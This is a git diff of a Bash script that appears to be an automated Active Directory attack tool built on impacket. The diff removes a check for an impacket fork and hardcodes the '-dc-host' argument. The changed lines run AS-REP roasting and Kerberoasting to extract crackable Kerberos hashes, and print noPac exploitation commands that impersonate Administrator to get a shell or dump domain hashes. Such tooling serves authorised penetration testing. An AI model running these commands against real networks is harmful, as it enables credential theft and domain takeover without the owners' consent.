@@ -272,9 +272,6 @@ prepare (){
         echo -e "${RED}[-] Passwords list file not found${NC}"
     fi
     
-    argument_ThePorgs=""
-    impacket_ThePorgs=$($impacket_findDelegation | head -n 1 | grep "ThePorgs")
-    if [ ! -z "${impacket_ThePorgs}" ]; then argument_ThePorgs="-dc-host ${dc_NETBIOS}"; fi
     echo -e ""
 
     if [[ $targets == "DC" ]]; then
@@ -887,7 +884,7 @@ deleg_enum_imp () {
         echo -e "${RED}[-] findDelegation.py not found! Please verify the installation of impacket${NC}"
     else
         echo -e "${BLUE}[*] Impacket findDelegation Enumeration${NC}"
-        run_command "${impacket_findDelegation} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} ${argument_ThePorgs}" | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
+        run_command "${impacket_findDelegation} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} -dc-host ${dc_NETBIOS}" | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
         if [[ $(grep 'error' ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt  2>/dev/null) ]]; then
             echo -e "${RED}[-] Errors during Delegation enum... ${NC}"
         fi
@@ -1323,11 +1320,11 @@ asrep_attack () {
                 echo -e "${YELLOW}[i] No credentials for target domain provided. Using $user_wordlist wordlist...${NC}"
                 users_scan_list=${user_wordlist}
             fi
-            run_command "${impacket_GetNPUsers} ${dc_domain} -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} ${argument_ThePorgs}"  > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
+            run_command "${impacket_GetNPUsers} ${dc_domain} -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}"  > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
             /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
         else
-            run_command "${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip} ${argument_ThePorgs}"
-            run_command "${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} ${argument_ThePorgs}" > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
+            run_command "${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}"
+            run_command "${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}" > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
             #${netexec} ${ne_verbose} smb ${servers_smb_list} "${argument_ne}" --asreproast --log ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>&1
         fi
         if [[ $(grep 'error' ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>/dev/null) ]]; then
@@ -1378,7 +1375,7 @@ kerberoast_attack () {
             echo -e "${BLUE}[*] Blind Kerberoasting Attack${NC}"
             asrep_user=$(/bin/cat ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>/dev/null| cut -d "@" -f 1 | head -n 1)
             if [ ! "${asrep_user}" == "" ]; then
-                run_command "${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${users_list} -dc-ip ${dc_ip} ${argument_ThePorgs} ${dc_domain}" 2>&1 > ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt
+                run_command "${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${users_list} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} ${dc_domain}" 2>&1 > ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt
                 if [[ $(grep 'error' ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt 2>/dev/null) ]]; then
                     echo -e "${RED}[-] Errors during Blind Kerberoast Attack... ${NC}"
                 else
@@ -1389,8 +1386,8 @@ kerberoast_attack () {
             fi
         else
             echo -e "${BLUE}[*] Kerberoast Attack${NC}"
-            run_command "${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} ${argument_ThePorgs} -target-domain ${dc_domain}" | tee ${output_dir}/Kerberos/kerberoast_list_output_${dc_domain}.txt
-            run_command "${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} ${argument_ThePorgs} -target-domain ${dc_domain}" > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
+            run_command "${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}" | tee ${output_dir}/Kerberos/kerberoast_list_output_${dc_domain}.txt
+            run_command "${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}" > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
             #${netexec} ${ne_verbose} smb ${servers_smb_list} "${argument_ne}" --kerberoasting --log ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt 2>&1
             if [[ $(grep 'error' ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt 2>/dev/null) ]]; then
                     echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
@@ -1574,9 +1571,9 @@ nopac_check () {
             if [[ $(grep "VULNERABLE" ${output_dir}/Vulnerabilities/ne_nopac_output_${dc_domain}.txt 2>/dev/null) ]]; then
                 echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}"
                 echo -e "${CYAN}# Get shell:${NC}"
-                echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip ${argument_ThePorgs} --impersonate Administrator -shell [-use-ldap]"
+                echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -shell [-use-ldap]"
                 echo -e "${CYAN}# Dump hashes:${NC}"
-                echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip ${argument_ThePorgs} --impersonate Administrator -dump [-use-ldap]"
+                echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -dump [-use-ldap]"
             fi
         done
     fi
